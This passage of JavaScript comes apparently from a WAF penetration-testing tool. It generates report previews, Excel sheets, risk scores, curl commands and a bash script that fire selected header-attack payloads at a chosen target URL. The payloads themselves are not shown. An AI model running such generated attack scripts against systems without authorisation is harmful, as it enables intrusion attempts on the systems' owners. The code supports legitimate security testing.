            document.getElementById('wafReportTitle').value = 'WAF Penetration Test Report';
            document.getElementById('wafIncludeDetailedAnalysis').checked = true;
            document.getElementById('wafIncludeCurlCommands').checked = true;
            document.getElementById('wafIncludeShellScript').checked = true;
            document.querySelector('input[name="wafColorTheme"][value="security"]').checked = true;
            break;
    }
}

// Refresh the preview
function refreshWafPreview() {
    const selectedTests = getSelectedTests();
    if (selectedTests.length === 0) {
        document.getElementById('wafPreviewContent').innerHTML = `
            <div class="waf-preview-placeholder">
                <i class="fas fa-exclamation-circle"></i>
                <p>Please select at least one test to generate a preview</p>
            </div>
        `;
        return;
    }
    
    const previewType = document.getElementById('wafPreviewSheet').value;
    generateWafPreview(previewType, selectedTests);
}

// Update the preview when changing the sheet type
function updateWafPreview() {
    refreshWafPreview();
}

// Generate preview for selected sheet
function generateWafPreview(previewType, tests) {
    const previewContent = document.getElementById('wafPreviewContent');
    previewContent.innerHTML = '<div class="waf-preview-loading"><i class="fas fa-spinner fa-spin"></i> Generating preview...</div>';
    
    setTimeout(() => {
        switch(previewType) {
            case 'executiveSummary':
                generateExecutiveSummaryPreview(tests);
                break;
                
            case 'detailedAnalysis':
                generateDetailedAnalysisPreview(tests);
                break;
                
            case 'statistics':
                generateStatisticsPreview(tests);
                break;
                
            case 'curlCommands':
                generateCurlCommandsPreview(tests);
                break;
                
            case 'shellScript':
                generateShellScriptPreview(tests);
                break;
        }
    }, 500);
}

// Generate Executive Summary preview
function generateExecutiveSummaryPreview(tests) {
    const targetUrl = document.getElementById('targetUrl').value || 'http://target.com';
    const reportTitle = document.getElementById('wafReportTitle').value || 'WAF Header Attack Test Report';
    const companyName = document.getElementById('wafCompanyName').value || '';
    
    // Count by severity
    const severityCounts = {
        'critical': 0,
        'high': 0,
        'medium': 0,
        'low': 0
    };
    
    tests.forEach(({ test }) => {
        if (severityCounts[test.severity] !== undefined) {
            severityCounts[test.severity]++;
        }
    });
    
    // Get the top 5 categories
    const categoryCounts = {};
    tests.forEach(({ category }) => {
        if (!categoryCounts[category]) {
            categoryCounts[category] = 0;
        }
        categoryCounts[category]++;
    });
    
    const topCategories = Object.entries(categoryCounts)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5);
    
    const previewContent = document.getElementById('wafPreviewContent');
    
    previewContent.innerHTML = `
        <div class="waf-preview-executive-summary">
            <div class="waf-preview-header">
                <h2>${reportTitle}</h2>
                ${companyName ? `<h3>${companyName}</h3>` : ''}
                <p class="waf-preview-date">Generated: ${new Date().toLocaleString()}</p>
            </div>
            
            <div class="waf-preview-summary-card">
                <h3>Executive Summary</h3>
                <p>This report provides an analysis of WAF (Web Application Firewall) header attack tests performed against <strong>${targetUrl}</strong>. The tests evaluate the security posture and resilience of the web application against various attack vectors targeting HTTP headers.</p>
                
                <div class="waf-preview-summary-stats">
                    <div class="waf-summary-stat">
                        <div class="waf-stat-value">${tests.length}</div>
                        <div class="waf-stat-label">Total Tests</div>
                    </div>
                    <div class="waf-summary-stat critical">
                        <div class="waf-stat-value">${severityCounts.critical}</div>
                        <div class="waf-stat-label">Critical</div>
                    </div>
                    <div class="waf-summary-stat high">
                        <div class="waf-stat-value">${severityCounts.high}</div>
                        <div class="waf-stat-label">High</div>
                    </div>
                    <div class="waf-summary-stat medium">
                        <div class="waf-stat-value">${severityCounts.medium}</div>
                        <div class="waf-stat-label">Medium</div>
                    </div>
                    <div class="waf-summary-stat low">
                        <div class="waf-stat-value">${severityCounts.low}</div>
                        <div class="waf-stat-label">Low</div>
                    </div>
                </div>
            </div>
            
            <div class="waf-preview-summary-card">
                <h3>Key Findings</h3>
                <div class="waf-key-findings">
                    <div class="waf-finding">
                        <div class="waf-finding-icon ${severityCounts.critical > 0 ? 'critical' : 'success'}">
                            <i class="fas ${severityCounts.critical > 0 ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i>
                        </div>
                        <div class="waf-finding-content">
                            <h4>Critical Vulnerabilities</h4>
                            <p>${severityCounts.critical > 0 ? 
                                `Identified ${severityCounts.critical} critical vulnerabilities that require immediate attention.` : 
                                'No critical vulnerabilities were identified in the tests.'}</p>
                        </div>
                    </div>
                    
                    <div class="waf-finding">
                        <div class="waf-finding-icon ${severityCounts.high > 0 ? 'high' : 'success'}">
                            <i class="fas ${severityCounts.high > 0 ? 'fa-exclamation-circle' : 'fa-check-circle'}"></i>
                        </div>
                        <div class="waf-finding-content">
                            <h4>High Risk Issues</h4>
                            <p>${severityCounts.high > 0 ? 
                                `Found ${severityCounts.high} high risk issues that should be addressed promptly.` : 
                                'No high risk issues were identified in the tests.'}</p>
                        </div>
                    </div>
                    
                    <div class="waf-finding">
                        <div class="waf-finding-icon ${topCategories.length > 0 ? 'medium' : 'success'}">
                            <i class="fas fa-shield-alt"></i>
                        </div>
                        <div class="waf-finding-content">
                            <h4>Primary Attack Vectors</h4>
                            <p>The most common attack vectors tested were ${
                                topCategories.length > 0 ? 
                                topCategories.map(([category]) => category).join(', ') : 
                                'not available due to insufficient data'
                            }.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    `;
}

// Generate Detailed Analysis preview
function generateDetailedAnalysisPreview(tests) {
    const targetUrl = document.getElementById('targetUrl').value || 'http://target.com';
    const proxyUrl = document.getElementById('proxyUrl').value || '';
    const requestMethod = document.getElementById('wafRequestMethod').value || 'GET';
    const curlFormat = document.getElementById('wafCurlFormat').value || 'verbose';
    
    const previewContent = document.getElementById('wafPreviewContent');
    
    previewContent.innerHTML = `
        <div class="waf-preview-detailed-analysis">
            <h3>Detailed Test Analysis</h3>
            <div class="waf-analysis-table-container">
                <table class="waf-analysis-table">
                    <thead>
                        <tr>
                            <th>Category</th>
                            <th>Test Name</th>
                            <th>Description</th>
                            <th>Severity</th>
                            <th>Payload</th>
                            <th>cURL Command</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${tests.slice(0, 5).map(({ category, test }) => {
                            const curlCommand = generateCurlCommand(test.payload, targetUrl, proxyUrl, requestMethod, curlFormat);
                            
                            return `
                                <tr class="waf-severity-${test.severity}">
                                    <td>${category}</td>
                                    <td><strong>${test.name}</strong></td>
                                    <td>${test.description}</td>
                                    <td><span class="waf-severity-badge ${test.severity}">${test.severity.toUpperCase()}</span></td>
                                    <td><code>${escapeHtml(test.payload)}</code></td>
                                    <td><code class="waf-curl-command">${escapeHtml(curlCommand)}</code></td>
                                </tr>
                            `;
                        }).join('')}
                        ${tests.length > 5 ? `
                            <tr class="waf-more-rows">
                                <td colspan="6" class="waf-more-info">
                                    <i class="fas fa-info-circle"></i> 
                                    Showing 5 of ${tests.length} tests. The full report will include all tests.
                                </td>
                            </tr>
                        ` : ''}
                    </tbody>
                </table>
            </div>
        </div>
    `;
}

// Generate Statistics preview
function generateStatisticsPreview(tests) {
    // Count by severity
    const severityCounts = {
        'critical': 0,
        'high': 0,
        'medium': 0,
        'low': 0
    };
    
    tests.forEach(({ test }) => {
        if (severityCounts[test.severity] !== undefined) {
            severityCounts[test.severity]++;
        }
    });
    
    // Count by category
    const categoryCounts = {};
    tests.forEach(({ category }) => {
        if (!categoryCounts[category]) {
            categoryCounts[category] = 0;
        }
        categoryCounts[category]++;
    });
    
    // Get top categories
    const topCategories = Object.entries(categoryCounts)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5);
    
    const previewContent = document.getElementById('wafPreviewContent');
    
    previewContent.innerHTML = `
        <div class="waf-preview-statistics">
            <div class="waf-statistics-grid">
                <div class="waf-statistics-card">
                    <h3>Test Distribution by Severity</h3>
                    <div class="waf-stat-donut-chart">
                        <div class="waf-donut-placeholder">
                            <div class="waf-severity-distribution">
                                <div class="waf-severity-segment critical" style="width: ${(severityCounts.critical / tests.length * 100).toFixed(1)}%"></div>
                                <div class="waf-severity-segment high" style="width: ${(severityCounts.high / tests.length * 100).toFixed(1)}%"></div>
                                <div class="waf-severity-segment medium" style="width: ${(severityCounts.medium / tests.length * 100).toFixed(1)}%"></div>
                                <div class="waf-severity-segment low" style="width: ${(severityCounts.low / tests.length * 100).toFixed(1)}%"></div>
                            </div>
                        </div>
                        <div class="waf-donut-legend">
                            <div class="waf-legend-item">
                                <span class="waf-legend-color critical"></span>
                                <span class="waf-legend-label">Critical (${severityCounts.critical})</span>
                            </div>
                            <div class="waf-legend-item">
                                <span class="waf-legend-color high"></span>
                                <span class="waf-legend-label">High (${severityCounts.high})</span>
                            </div>
                            <div class="waf-legend-item">
                                <span class="waf-legend-color medium"></span>
                                <span class="waf-legend-label">Medium (${severityCounts.medium})</span>
                            </div>
                            <div class="waf-legend-item">
                                <span class="waf-legend-color low"></span>
                                <span class="waf-legend-label">Low (${severityCounts.low})</span>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="waf-statistics-card">
                    <h3>Top Attack Categories</h3>
                    <div class="waf-category-chart">
                        ${topCategories.map(([category, count]) => `
                            <div class="waf-category-bar">
                                <div class="waf-category-name">${category}</div>
                                <div class="waf-category-bar-container">
                                    <div class="waf-category-bar-fill" style="width: ${(count / tests.length * 100).toFixed(1)}%"></div>
                                </div>
                                <div class="waf-category-count">${count}</div>
                            </div>
                        `).join('')}
                    </div>
                </div>
                
                <div class="waf-statistics-card summary-metrics">
                    <h3>Summary Metrics</h3>
                    <div class="waf-metrics-grid">
                        <div class="waf-metric-item">
                            <div class="waf-metric-value">${tests.length}</div>
                            <div class="waf-metric-label">Total Tests</div>
                        </div>
                        <div class="waf-metric-item">
                            <div class="waf-metric-value">${Object.keys(categoryCounts).length}</div>
                            <div class="waf-metric-label">Categories</div>
                        </div>
                        <div class="waf-metric-item">
                            <div class="waf-metric-value">${((severityCounts.critical + severityCounts.high) / tests.length * 100).toFixed(1)}%</div>
                            <div class="waf-metric-label">High Risk</div>
                        </div>
                        <div class="waf-metric-item">
                            <div class="waf-metric-value">${((severityCounts.medium + severityCounts.low) / tests.length * 100).toFixed(1)}%</div>
                            <div class="waf-metric-label">Low Risk</div>
                        </div>
                    </div>
                </div>
                
                <div class="waf-statistics-card">
                    <h3>Risk Assessment</h3>
                    <div class="waf-risk-assessment">
                        <div class="waf-risk-meter-container">
                            <div class="waf-risk-meter">
                                <div class="waf-risk-level" style="--risk-level: ${calculateRiskLevel(severityCounts, tests.length)}%"></div>
                            </div>
                            <div class="waf-risk-labels">
                                <span>Low</span>
                                <span>Medium</span>
                                <span>High</span>
                                <span>Critical</span>
                            </div>
                        </div>
                        <div class="waf-risk-summary">
                            <p>Based on the selected test suite, the overall risk level is 
                            <strong>${getRiskCategory(calculateRiskLevel(severityCounts, tests.length))}</strong>.</p>
                            <p>The assessment is based on ${tests.length} tests across ${Object.keys(categoryCounts).length} attack categories.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    `;
}

// Generate cURL Commands preview
function generateCurlCommandsPreview(tests) {
    const targetUrl = document.getElementById('targetUrl').value || 'http://target.com';
    const proxyUrl = document.getElementById('proxyUrl').value || '';
    const requestMethod = document.getElementById('wafRequestMethod').value || 'GET';
    const curlFormat = document.getElementById('wafCurlFormat').value || 'verbose';
    
    const previewContent = document.getElementById('wafPreviewContent');
    
    previewContent.innerHTML = `
        <div class="waf-preview-curl-commands">
            <h3>cURL Command Generation</h3>
            <p>Below are sample cURL commands for executing the selected WAF header attack tests. Each command is designed to send the specific payload to the target URL.</p>
            
            <div class="waf-curl-list">
                ${tests.slice(0, 5).map(({ category, test }, index) => {
                    const curlCommand = generateCurlCommand(test.payload, targetUrl, proxyUrl, requestMethod, curlFormat);
                    
                    return `
                        <div class="waf-curl-item">
                            <div class="waf-curl-header">
                                <div class="waf-curl-title">
                                    <span class="waf-curl-badge">${index + 1}</span>
                                    ${test.name}
                                </div>
                                <span class="waf-severity-badge ${test.severity}">${test.severity.toUpperCase()}</span>
                            </div>
                            <div class="waf-curl-content">
                                <div class="waf-curl-command">${escapeHtml(curlCommand)}</div>
                            </div>
                            <div class="waf-curl-action">
                                <button class="waf-curl-copy" onclick="copyToClipboard('${escapeHtml(curlCommand)}')">
                                    <i class="fas fa-copy"></i> Copy Command
                                </button>
                            </div>
                        </div>
                    `;
                }).join('')}
                
                ${tests.length > 5 ? `
                    <div class="waf-curl-item">
                        <div class="waf-curl-header">
                            <div class="waf-curl-title">
                                <i class="fas fa-info-circle"></i>
                                Additional Commands
                            </div>
                        </div>
                        <div class="waf-curl-content">
                            <p>The full report will include cURL commands for all ${tests.length} selected tests.</p>
                        </div>
                    </div>
                ` : ''}
            </div>
        </div>
    `;
}

// Generate Shell Script preview
function generateShellScriptPreview(tests) {
    const targetUrl = document.getElementById('targetUrl').value || 'http://target.com';
    const proxyUrl = document.getElementById('proxyUrl').value || '';
    const requestMethod = document.getElementById('wafRequestMethod').value || 'GET';
    const curlFormat = document.getElementById('wafCurlFormat').value || 'verbose';
    
    // Generate shell script content
    let scriptContent = `#!/bin/bash
# WAF Header Attack Test Script
# Generated: ${new Date().toISOString()}
# Target: ${targetUrl}
# Total Tests: ${tests.length}

TARGET="${targetUrl}"
${proxyUrl ? `PROXY="${proxyUrl}"` : '# No proxy configured'}
LOGFILE="waf_test_$(date +%Y%m%d_%H%M%S).log"

echo "Starting WAF Header Attack Tests..." | tee $LOGFILE
echo "Target: $TARGET" | tee -a $LOGFILE
echo "===========================================" | tee -a $LOGFILE

`;

    // Add first 5 tests for preview
    tests.slice(0, 5).forEach(({ category, test }, index) => {
        const curlCommand = generateCurlCommand(test.payload, targetUrl, proxyUrl, requestMethod, curlFormat);
        
        scriptContent += `
# Test ${index + 1}: ${category} - ${test.name}
echo -e "\\n[TEST ${index + 1}] ${test.name}" | tee -a $LOGFILE
echo "[DESCRIPTION] ${test.description}" | tee -a $LOGFILE
echo "[SEVERITY] ${test.severity.toUpperCase()}" | tee -a $LOGFILE

${curlCommand} 2>&1 | tee -a $LOGFILE
echo "-------------------------------------------" | tee -a $LOGFILE
`;
    });
    
    // Add ending
    scriptContent += `
# ... additional tests would be included in the full script ...

echo -e "\\nTesting complete. Results saved to: $LOGFILE"
echo "Total tests executed: ${tests.length}"
`;
    
    const previewContent = document.getElementById('wafPreviewContent');
    
    previewContent.innerHTML = `
        <div class="waf-preview-shell-script">
            <h3>Shell Script Generator</h3>
            <p>This bash script will execute all ${tests.length} selected WAF header attack tests and log the results. The script can be downloaded and run directly on Linux or macOS systems with cURL installed.</p>
            
            <div class="waf-shell-container">
                <div class="waf-shell-header">
                    <div class="waf-shell-title">waf_header_attack_test.sh</div>
                    <div class="waf-shell-actions">
                        <button class="waf-shell-action" onclick="copyToClipboard(\`${escapeHtml(scriptContent)}\`)">
                            <i class="fas fa-copy"></i> Copy
                        </button>
                    </div>
                </div>
                <div class="waf-shell-content">
                    ${formatShellScript(scriptContent)}
                </div>
            </div>
        </div>
    `;
}

// Format shell script with syntax highlighting
function formatShellScript(script) {
    return script.split('\n').map(line => {
        let formattedLine = escapeHtml(line);
        
        if (line.startsWith('#')) {
            // Comment
            formattedLine = `<span class="waf-shell-comment">${formattedLine}</span>`;
        } else if (line.includes('echo')) {
            // Echo command
            formattedLine = formattedLine.replace(/echo(.*)/g, '<span class="waf-shell-command">echo</span>$1');
        } else if (line.includes('curl')) {
            // cURL command
            formattedLine = `<span class="waf-shell-command">${formattedLine}</span>`;
        } else if (line.match(/^[A-Z_]+=.*/)) {
            // Variable assignment
            formattedLine = `<span class="waf-shell-variable">${formattedLine}</span>`;
        }
        
        return `<p class="waf-shell-line">${formattedLine}</p>`;
    }).join('');
}

// Copy text to clipboard
function copyToClipboard(text) {
    const textarea = document.createElement('textarea');
    textarea.value = text;
    document.body.appendChild(textarea);
    textarea.select();
    document.execCommand('copy');
    document.body.removeChild(textarea);
    
    // Show a brief success message
    alert('Copied to clipboard!');
}

// Generate cURL command
function generateCurlCommand(payload, targetUrl, proxyUrl, method = 'GET', format = 'verbose') {
    // Start with basic curl command
    let curlCmd = `curl`;
    
    // Add format options
    switch (format) {
        case 'verbose':
            curlCmd += ` -v`;
            break;
        case 'insecure':
            curlCmd += ` -k`;
            break;
        case 'full':
            curlCmd += ` -v -k`;
            break;
    }
    
    // Add HTTP method if not GET
    if (method !== 'GET') {
        curlCmd += ` -X ${method}`;
    }
    
    // Add proxy if specified
    if (proxyUrl) {
        curlCmd += ` -x "${proxyUrl}"`;
    }
    
    // Get any additional headers
    const additionalHeaders = getAdditionalHeaders();
    
    // Add the headers
    if (additionalHeaders.length > 0) {
        additionalHeaders.forEach(header => {
            curlCmd += ` -H "${escapeForBash(header.name)}: ${escapeForBash(header.value)}"`;
        });
    }
    
    // Handle the payload - escape for bash double quotes
    let escapedPayload = escapeForBash(payload);
    
    // Add the header or data based on payload format
    if (payload.includes(':')) {
        // It's a header
        curlCmd += ` -H "${escapedPayload}"`;
    } else {
        // It's data
        curlCmd += ` --data-raw "${escapedPayload}"`;
    }
    
    // Add the target URL
    curlCmd += ` "${targetUrl}"`;
    
    return curlCmd;
}

// Get additional headers from the UI
function getAdditionalHeaders() {
    const headers = [];
    const headerRows = document.querySelectorAll('.waf-header-row');
    
    headerRows.forEach(row => {
        const nameInput = row.querySelector('.waf-header-name');
        const valueInput = row.querySelector('.waf-header-value');
        
        if (nameInput && valueInput && nameInput.value.trim() !== '') {
            headers.push({
                name: nameInput.value.trim(),
                value: valueInput.value.trim()
            });
        }
    });
    
    return headers;
}

// Escape string for use in bash double quotes
function escapeForBash(str) {
    return str
        .replace(/\\/g, '\\\\')  // Escape backslashes
        .replace(/"/g, '\\"')    // Escape double quotes
        .replace(/\$/g, '\\$')   // Escape dollar signs
        .replace(/`/g, '\\`');   // Escape backticks
}

// Function to calculate risk level
function calculateRiskLevel(severityCounts, totalTests) {
    if (totalTests === 0) return 0;
    
    // Weighted risk calculation
    const criticalWeight = 100;
    const highWeight = 70;
    const mediumWeight = 40;
    const lowWeight = 10;
    
    const weightedSum = 
        severityCounts.critical * criticalWeight +
        severityCounts.high * highWeight +
        severityCounts.medium * mediumWeight +
        severityCounts.low * lowWeight;
    
    // Maximum possible risk (if all were critical)
    const maxRisk = totalTests * criticalWeight;
    
    return (weightedSum / maxRisk) * 100;
}

// Function to get risk category
function getRiskCategory(riskLevel) {
    if (riskLevel >= 75) return 'Critical';
    if (riskLevel >= 50) return 'High';
    if (riskLevel >= 25) return 'Medium';
    return 'Low';
}

// Generate the advanced Excel report
function generateAdvancedWafReport() {
    const selectedTests = getSelectedTests();
    
    if (selectedTests.length === 0) {
        alert('Please select at least one test');
        return;
    }
    
    // Show progress overlay
    const progressOverlay = document.getElementById('wafReportProgress');
    progressOverlay.classList.add('active');
    
    // Get report options
    const reportTitle = document.getElementById('wafReportTitle').value || 'WAF Header Attack Test Report';
    const companyName = document.getElementById('wafCompanyName').value || '';
    const reportAuthor = document.getElementById('wafReportAuthor').value || '';
    const targetUrl = document.getElementById('targetUrl').value || 'http://target.com';
    const proxyUrl = document.getElementById('proxyUrl').value || '';
    const colorTheme = document.querySelector('input[name="wafColorTheme"]:checked').value;
    const reportFormat = document.querySelector('input[name="wafReportFormat"]:checked').value;
    const requestMethod = document.getElementById('wafRequestMethod').value || 'GET';
    const curlFormat = document.getElementById('wafCurlFormat').value || 'verbose';
    
    // Feature options
    const includeExecutiveSummary = document.getElementById('wafIncludeExecutiveSummary').checked;
    const includeDetailedAnalysis = document.getElementById('wafIncludeDetailedAnalysis').checked;
    const includeStatistics = document.getElementById('wafIncludeStatistics').checked;
    const includeCharts = document.getElementById('wafIncludeCharts').checked;
    const includePayloads = document.getElementById('wafIncludePayloads').checked;
    const includeCurlCommands = document.getElementById('wafIncludeCurlCommands').checked;
    const includeRecommendations = document.getElementById('wafIncludeRecommendations').checked;
    const includeShellScript = document.getElementById('wafIncludeShellScript').checked;
    
    // Additional headers
    const additionalHeaders = getAdditionalHeaders();
    
    // Update progress
    updateWafProgress(10, 'Preparing report data...');
    
    // Start report generation process
    setTimeout(() => {
        try {
            // Create workbook
            const wb = XLSX.utils.book_new();
            
            // Add workbook properties
            wb.Props = {
                Title: reportTitle,
                Subject: 'Security Test Report',
                Author: reportAuthor || 'WAF Testing Suite',
                CreatedDate: new Date()
            };
            
            updateWafProgress(20, 'Building executive summary...');
            
            // Create executive summary worksheet
            if (includeExecutiveSummary) {
                const summaryData = createExecutiveSummaryData(selectedTests, targetUrl, reportTitle, companyName, reportAuthor);
                const summaryWs = XLSX.utils.aoa_to_sheet(summaryData);
                applyWorksheetStyling(summaryWs, 'executiveSummary', colorTheme);
                XLSX.utils.book_append_sheet(wb, summaryWs, "Executive Summary");
            }
            
            updateWafProgress(35, 'Generating detailed analysis...');
            
            // Create detailed analysis worksheet
            if (includeDetailedAnalysis) {
                const detailedData = createDetailedAnalysisData(selectedTests, includePayloads, targetUrl, proxyUrl, requestMethod, curlFormat);
                const detailedWs = XLSX.utils.aoa_to_sheet(detailedData);
                applyWorksheetStyling(detailedWs, 'detailedAnalysis', colorTheme);
                XLSX.utils.book_append_sheet(wb, detailedWs, "Detailed Analysis");
            }
            
            updateWafProgress(50, 'Building statistics dashboard...');
            
            // Create statistics worksheet
            if (includeStatistics) {
                const statsData = createStatisticsData(selectedTests);
                const statsWs = XLSX.utils.aoa_to_sheet(statsData);
                applyWorksheetStyling(statsWs, 'statistics', colorTheme);
                XLSX.utils.book_append_sheet(wb, statsWs, "Statistics");
            }
            
            updateWafProgress(65, 'Generating cURL commands...');
            
            // Create cURL commands worksheet
            if (includeCurlCommands) {
                const curlData = createCurlCommandsData(selectedTests, targetUrl, proxyUrl, requestMethod, curlFormat, additionalHeaders);
                const curlWs = XLSX.utils.aoa_to_sheet(curlData);
                applyWorksheetStyling(curlWs, 'curlCommands', colorTheme);
                XLSX.utils.book_append_sheet(wb, curlWs, "cURL Commands");
            }
            
            updateWafProgress(75, 'Creating shell script...');
            
            // Create shell script worksheet
            if (includeShellScript) {
                const shellData = createShellScriptData(selectedTests, targetUrl, proxyUrl, requestMethod, curlFormat, additionalHeaders);
                const shellWs = XLSX.utils.aoa_to_sheet(shellData);
                applyWorksheetStyling(shellWs, 'shellScript', colorTheme);
                XLSX.utils.book_append_sheet(wb, shellWs, "Shell Script");
            }
            
            updateWafProgress(85, 'Generating recommendations...');
            
            // Create recommendations worksheet
            if (includeRecommendations) {
                const recommendationsData = createRecommendationsData(selectedTests);
                const recommendationsWs = XLSX.utils.aoa_to_sheet(recommendationsData);
                applyWorksheetStyling(recommendationsWs, 'recommendations', colorTheme);
                XLSX.utils.book_append_sheet(wb, recommendationsWs, "Recommendations");
            }
            
            updateWafProgress(95, 'Finalizing report...');
            
            // Generate filename with timestamp
            const timestamp = new Date().toISOString().replace(/[:.]/g, '-').substring(0, 19);
            let filename = `WAF_Test_Report_${timestamp}`;
            
            if (companyName) {
                filename = `${companyName.replace(/[^a-zA-Z0-9]/g, '_')}_${filename}`;
            }
            
            // Add extension based on format
            filename += reportFormat === 'xlsx' ? '.xlsx' : '.csv';
            
            // Write and download the file
            XLSX.writeFile(wb, filename);
            
            // Update report history
            addToWafReportHistory({
                title: reportTitle,
                timestamp: new Date(),
                filename: filename,
                testCount: selectedTests.length
            });
            
            updateWafProgress(100, 'Report generated successfully!');
            
            // Hide progress overlay after a short delay
            setTimeout(() => {
                progressOverlay.classList.remove('active');
                
                // Show success message
                showWafSuccessMessage(filename);
                
                // Close the panel
                toggleReportPanel();
            }, 1000);
        } catch (error) {
            console.error('Error generating report:', error);
            
            // Hide progress overlay
            progressOverlay.classList.remove('active');
            
            // Show error message
            alert('An error occurred while generating the report. Please try again.');
        }
    }, 500);
}

// Update progress indicator
function updateWafProgress(percent, status) {
    document.getElementById('wafReportProgressBar').style.width = `${percent}%`;
    document.getElementById('wafReportProgressStatus').textContent = status;
}

// Create executive summary data
function createExecutiveSummaryData(tests, targetUrl, reportTitle, companyName, reportAuthor) {
    // Count by severity
    const severityCounts = {
        'critical': 0,
        'high': 0,
        'medium': 0,
        'low': 0
    };
    
    tests.forEach(({ test }) => {
        if (severityCounts[test.severity] !== undefined) {
            severityCounts[test.severity]++;
        }
    });
    
    // Count by category
    const categoryCounts = {};
    tests.forEach(({ category }) => {
        if (!categoryCounts[category]) {
            categoryCounts[category] = 0;
        }
        categoryCounts[category]++;
    });
    
    // Calculate risk level
    const riskLevel = calculateRiskLevel(severityCounts, tests.length);
    const riskCategory = getRiskCategory(riskLevel);
    
    // Get top categories
    const topCategories = Object.entries(categoryCounts)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5)
        .map(([category]) => category)
        .join(', ');
    
    // Create data
    const data = [
        [reportTitle, '', '', '', '', ''],
        ['', '', '', '', '', ''],
        ['Executive Summary', '', '', '', '', ''],
        ['', '', '', '', '', ''],
        ['Report Information', '', '', '', '', ''],
        ['Target URL:', targetUrl, '', '', '', ''],
        ['Generated:', new Date().toLocaleString(), '', '', '', ''],
        ['Company:', companyName || 'Not specified', '', '', '', ''],
        ['Author:', reportAuthor || 'Not specified', '', '', '', ''],
        ['', '', '', '', '', ''],
        ['Test Summary', '', '', '', '', ''],
        ['Total Tests:', tests.length.toString(), '', '', '', ''],
        ['Risk Assessment:', riskCategory, '', '', '', ''],
        ['', '', '', '', '', ''],
        ['Severity Breakdown', '', '', '', '', ''],
        ['Critical:', severityCounts.critical.toString(), `${((severityCounts.critical / tests.length) * 100).toFixed(1)}%`, '', '', ''],
        ['High:', severityCounts.high.toString(), `${((severityCounts.high / tests.length) * 100).toFixed(1)}%`, '', '', ''],
        ['Medium:', severityCounts.medium.toString(), `${((severityCounts.medium / tests.length) * 100).toFixed(1)}%`, '', '', ''],
        ['Low:', severityCounts.low.toString(), `${((severityCounts.low / tests.length) * 100).toFixed(1)}%`, '', '', ''],
        ['', '', '', '', '', ''],
        ['Key Findings', '', '', '', '', ''],
        ['', '', '', '', '', '']
    ];
    
    // Add key findings based on severity counts
    if (severityCounts.critical > 0) {
        data.push([
            ` Critical Vulnerabilities: Identified ${severityCounts.critical} critical issues that require immediate attention.`,
            '', '', '', '', ''
        ]);
    }
    
    if (severityCounts.high > 0) {
        data.push([
            ` High Risk Issues: Found ${severityCounts.high} high-risk vulnerabilities that should be addressed promptly.`,
            '', '', '', '', ''
        ]);
    }
    
    data.push([
        ` Primary Attack Vectors: The most common attack categories tested were ${topCategories}.`,
        '', '', '', '', ''
    ]);
    
    data.push([
        '', '', '', '', '', ''
    ]);
    
    // Add executive recommendations
    data.push([
        'Executive Recommendations', '', '', '', '', ''
    ]);
    
    data.push([
        '', '', '', '', '', ''
    ]);
    
    if (severityCounts.critical > 0) {
        data.push([
            '1. Address critical vulnerabilities immediately to mitigate potential system compromise.',
            '', '', '', '', ''
        ]);
    }
    
    if (severityCounts.high > 0) {
        data.push([
            '2. Implement WAF rule enhancements for high-risk attack vectors, particularly for header manipulation.',
            '', '', '', '', ''
        ]);
    }
    
    data.push([
        '3. Review WAF configuration to ensure proper handling of malformed HTTP headers.',
        '', '', '', '', ''
    ]);
    
    data.push([
        '4. Conduct regular security testing with updated attack patterns to maintain robust protection.',
        '', '', '', '', ''
    ]);
    
    return data;
}

// Create detailed analysis data with cURL commands
function createDetailedAnalysisData(tests, includePayloads, targetUrl, proxyUrl, requestMethod, curlFormat) {
    // Determine columns based on includePayloads
    const headers = includePayloads ? 
        ['Category', 'Test Name', 'Description', 'Severity', 'Payload', 'cURL Command'] :
        ['Category', 'Test Name', 'Description', 'Severity', 'cURL Command'];
    
    const data = [headers];
    
    // Add test rows
    tests.forEach(({ category, test }) => {
        const curlCommand = generateCurlCommand(test.payload, targetUrl, proxyUrl, requestMethod, curlFormat);
        
        if (includePayloads) {
            data.push([
                category,
                test.name,
                test.description,
                test.severity.toUpperCase(),
                test.payload,
                curlCommand
            ]);
        } else {
            data.push([
                category,
                test.name,
                test.description,
                test.severity.toUpperCase(),
                curlCommand
            ]);
        }
    });
    
    return data;
}

// Create statistics data
function createStatisticsData(tests) {
    // Count by severity
    const severityCounts = {
        'critical': 0,
        'high': 0,
        'medium': 0,
        'low': 0
    };
    
    tests.forEach(({ test }) => {
        if (severityCounts[test.severity] !== undefined) {
            severityCounts[test.severity]++;
        }
    });
    
    // Count by category
    const categoryCounts = {};
    tests.forEach(({ category }) => {
        if (!categoryCounts[category]) {
            categoryCounts[category] = 0;
        }
        categoryCounts[category]++;
    });
    
    // Create data
    const data = [
        ['WAF Header Attack Test Statistics', '', '', ''],
        ['', '', '', ''],
        ['Tests by Severity', '', '', ''],
        ['Severity', 'Count', 'Percentage', 'Risk Weight'],
    ];
    
    // Add severity stats
    data.push(['Critical', severityCounts.critical, ((severityCounts.critical / tests.length) * 100).toFixed(1) + '%', '100']);
    data.push(['High', severityCounts.high, ((severityCounts.high / tests.length) * 100).toFixed(1) + '%', '70']);
    data.push(['Medium', severityCounts.medium, ((severityCounts.medium / tests.length) * 100).toFixed(1) + '%', '40']);
    data.push(['Low', severityCounts.low, ((severityCounts.low / tests.length) * 100).toFixed(1) + '%', '10']);
    
    data.push(['', '', '', '']);
    data.push(['Tests by Category', '', '', '']);
    data.push(['Category', 'Count', 'Percentage', '']);
    
    // Add category stats
    Object.entries(categoryCounts).sort().forEach(([category, count]) => {
        data.push([
            category,
            count,
            ((count / tests.length) * 100).toFixed(1) + '%',
            ''
        ]);
    });
    
    // Calculate risk metrics
    const riskLevel = calculateRiskLevel(severityCounts, tests.length);
    
    data.push(['', '', '', '']);
    data.push(['Risk Assessment', '', '', '']);
    data.push(['Overall Risk Level', riskLevel.toFixed(1) + '%', '', '']);
    data.push(['Risk Category', getRiskCategory(riskLevel), '', '']);
    data.push(['Total Tests', tests.length.toString(), '', '']);
    data.push(['High Risk Tests', (severityCounts.critical + severityCounts.high).toString(), '', '']);
    data.push(['Low Risk Tests', (severityCounts.medium + severityCounts.low).toString(), '', '']);
    
    return data;
}

